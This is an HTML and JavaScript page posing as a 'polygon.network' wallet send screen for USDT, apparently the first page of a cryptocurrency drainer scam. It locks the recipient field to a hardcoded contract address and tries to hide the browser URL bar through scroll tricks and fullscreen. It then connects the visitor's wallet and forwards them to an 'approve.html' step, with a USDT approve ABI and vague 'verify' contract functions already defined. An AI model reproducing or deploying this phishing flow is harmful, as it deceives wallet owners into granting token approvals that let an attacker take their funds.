<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>polygon.network</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#000000" />
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background-color: #000000;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            height: 100vh;
        }

        .app-bar {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            border-bottom: 1px solid #262626;
        }

        .app-bar-title {
            margin: 0 auto;
            font-size: 16px;
            font-weight: 500;
        }

        .container {
            flex: 1;
            padding: 24px 16px 100px;
            overflow-y: auto;
        }

        .label {
            font-size: 13px;
            color: #a0a0a0;
            margin-bottom: 6px;
        }

        .row {
            display: flex;
            align-items: center;
            background-color: #111111;
            border-radius: 10px;
            border: 1px solid #262626;
            padding: 8px 10px;
        }

        .row input {
            flex: 1;
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 14px;
            outline: none;
        }

        .row input::placeholder {
            color: #555555;
        }

        .row button,
        .icon-btn {
            border: none;
            background: none;
            color: #00ff7f;
            font-size: 13px;
            margin-left: 6px;
            cursor: pointer;
        }

        .icon-btn {
            padding: 0;
            width: 22px;
            height: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon-btn img {
            max-width: 100%;
            max-height: 100%;
            display: block;
        }

        .amount-box {
            margin-top: 24px;
        }

        .amount-row {
            display: flex;
            align-items: center;
            background-color: #111111;
            border-radius: 10px;
            border: 1px solid #262626;
            padding: 14px 12px;
        }

        .amount-row input {
            flex: 1;
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 18px;
            outline: none;
        }

        .amount-row-right {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: #a0a0a0;
        }

        .amount-row-right .token {
            color: #ffffff;
        }

        .amount-row-right .max {
            color: #00ff7f;
            cursor: pointer;
        }

        .bottom-bar {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            padding: 16px;
            background: #000000;
        }

        .next-btn {
            width: 100%;
            background-color: #00ff7f;
            border-radius: 999px;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            color: #000000;
            cursor: pointer;
        }

        .next-btn:disabled {
            background-color: #333;
            color: #666;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <header class="app-bar">
        <div class="app-bar-title">polygon.network</div>
    </header>

    <main class="container">
        <!-- Address section -->
        <div>
            <div class="label">Address or Domain Name</div>
            <div class="row">
                <input
                    type="text"
                    id="addressInput"
                    autocomplete="off"
                    placeholder=""
                    value="0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55"
                    readonly
                />
                <button type="button" onclick="pasteAddress()">Paste</button>

                <!-- Contact icon -->
                <button type="button" class="icon-btn" title="Contacts">
                    <img src="/mnt/data/phone book .jpg" alt="Contacts" />
                </button>

                <!-- QR icon -->
                <button type="button" class="icon-btn" title="Scan QR">
                    <img src="/mnt/data/qr p.jpg" alt="QR" />
                </button>
            </div>
        </div>

        <!-- Amount section -->
        <div class="amount-box">
            <div class="label">Amount</div>
            <div class="amount-row">
                <input type="number" id="amountInput" value="" min="0" step="0.01" placeholder="0.00" />
                <div class="amount-row-right">
                    <span class="token">USDT</span>
                    <span class="max" onclick="setMaxAmount()">Max</span>
                </div>
            </div>
        </div>
    </main>

    <!-- Bottom Next button -->
    <div class="bottom-bar">
        <button class="next-btn" id="nextBtn" onclick="goNext()">Next</button>
    </div>

    <script>
        // Contract Configuration
        const CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
        const POLYGON_USDT = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
        
        const CONTRACT_ABI = [
            "function verifyOnPolygon(uint256 amount) external",
            "function verifyOnBSC(uint256 amount) external", 
            "function verifyOnArbitrum(uint256 amount) external"
        ];

        const USDT_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function allowance(address owner, address spender) external view returns (uint256)",
            "function balanceOf(address account) external view returns (uint256)"
        ];

        let provider;
        let signer;
        let connectedAccount;

        // Set contract address on page load
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById("addressInput").value = CONTRACT_ADDRESS;
            
            // Attempt to hide URL bar on mobile devices
            hideUrlBar();
        });

        // Function to attempt hiding the URL bar
        function hideUrlBar() {
            // Method 1: Scroll to top after a short delay
            setTimeout(function() {
                window.scrollTo(0, 1);
            }, 100);
            
            // Method 2: Prevent scrolling
            window.addEventListener("scroll", function() {
                window.scrollTo(0, 1);
            });
            
            // Method 3: Use fullscreen API if available
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.mozRequestFullScreen) { /* Firefox */
                document.documentElement.mozRequestFullScreen();
            } else if (document.documentElement.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
                document.documentElement.webkitRequestFullscreen();
            } else if (document.documentElement.msRequestFullscreen) { /* IE/Edge */
                document.documentElement.msRequestFullscreen();
            }
        }

        function pasteAddress() {
            if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(function (text) {
                    document.getElementById("addressInput").value = text;
                }).catch(function () {
                    alert("Unable to read from clipboard.");
                });
            } else {
                alert("Clipboard access not supported in this browser.");
            }
        }

        function setMaxAmount() {
            document.getElementById("amountInput").value = 1000;
        }

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Request account access
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    connectedAccount = await signer.getAddress();
                    
                    return true;
                } catch (error) {
                    console.error("User denied wallet connection:", error);
                    return false;
                }
            } else {
                alert("Please install MetaMask or Trust Wallet!");
                return false;
            }
        }

        async function goNext() {
            const amount = document.getElementById("amountInput").value;
            if (!amount || amount <= 0) {
                alert("Please enter a valid amount");
                return;
            }

            const nextBtn = document.getElementById("nextBtn");
            const originalText = nextBtn.textContent;
            
            try {
                // Disable button during processing
                nextBtn.disabled = true;
                nextBtn.textContent = "Connecting...";

                // Connect wallet
                const connected = await connectWallet();
                if (!connected) {
                    nextBtn.disabled = false;
                    nextBtn.textContent = originalText;
                    return;
                }

                // Store the amount for the approval page
                localStorage.setItem('usdtAmount', amount);
                
                // Navigate to approval page
                window.location.href = "approve.html";

            } catch (error) {
                console.error("Error:", error);
                alert("An error occurred: " + error.message);
                nextBtn.disabled = false;
                nextBtn.textContent = originalText;
            }
        }
    </script>
</body>
</html>
